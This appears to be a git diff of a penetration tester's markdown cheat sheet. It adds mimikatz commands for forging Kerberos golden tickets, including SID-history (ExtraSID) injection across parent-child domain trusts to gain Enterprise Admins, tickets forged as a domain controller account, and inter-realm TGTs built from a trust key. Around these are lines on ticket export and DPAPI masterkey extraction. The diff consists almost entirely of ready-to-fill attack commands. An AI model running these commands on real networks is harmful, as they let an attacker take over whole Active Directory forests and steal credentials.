@@ -83,11 +83,25 @@ sekurksa::tickets
 sekurlsa::tickets /export
 ```
 
-## tickets - golden child-parent trust SIDHistory injection  
+## tickets - golden   
 ```
-kerberos::golden /export /user:<user|jubeaz> /krbtgt:<krbtgt_nthash>  /sid:<child_somain_sid> /domain:<child_domain_FQDN> /sids:<root_domain_sid>-<rid|519> /ptt
+kerberos::golden /user:<user|administrator> /id:<user_rid|500> /group:500,501,513,512,520,518 /krbtgt:<krbtgt_nthash>  /sid:<domain_sid> /domain:<domain_fqdn> /ptt [/ticket:c:\temp\trust.kirbi]
 ```
 
+## tickets - golden + ExtraSID (parent-child)  
+```
+kerberos::golden /export /user:<user|jubeaz> /id:<user_rid> /group:500,501,513,512,520,518 /krbtgt:<krbtgt_nthash>  /sid:<src_domain_sid> /domain:<src_domain_fqdn> /sids:<dst_domain_sid>-<rid|519> /ptt [/ticket:c:\temp\trust.kirbi]
+```
+
+## tickets - golden + ExtraSID (parent-child) (dc account)
+```
+kerberos::golden /export /user:<dc_name>$ /id:<dc_rid> /krbtgt:<krbtgt_nthash>  /groups:516 /sid:<src_domain_sid> /domain:<src_domain_fqdn> /sids:<dst_domain_sid>-<rid|516> [/startoffset:-10 /endin:60 /renewmax:10080] /ptt [/ticket:c:\temp\trust.kirbi]
+```
+
+## tickets - (golden) Inter-Realm TGT  
+```
+kerberos::golden /export /user:<user> /id:<user_rid> /group:500,501,513,512,520,518 /rc4:<trust_nthash>  /sid:<src_domain_sid> /domain:<src_domain_FQDN> /sids:<dst_domain_sid>-<rid|519> /service:krbtgt /target:<dst_domain_fqdn> /ptt [/ticket:c:\temp\trust.kirbi]
+```
 
 % mimikatz, dpapi, credman
 
@@ -141,7 +155,7 @@ dpapi::masterkey /in:"C:\Users\<username>\AppData\Roaming\Microsoft\Protect\<SID
 sid : origin domain sid : Get-DomainSID -Domain domainname
 sids :  ExtraSid value (Enterprise Admins SID) : parent SID	
 ```powershell
-kerberos::golden /user:<user> /domain:<domain> /sid:<child_sid> /krbtgt:<krbtgt_ntlm> /sids:<parent_sid>-519 /ptt
+kerberos::golden /user:<user> /domain:<child_fqdn> /sid:<child_sid> /krbtgt:<krbtgt_ntlm> /sids:<parent_sid>-519 /ptt
 ```
 
 % mimikatz, pth
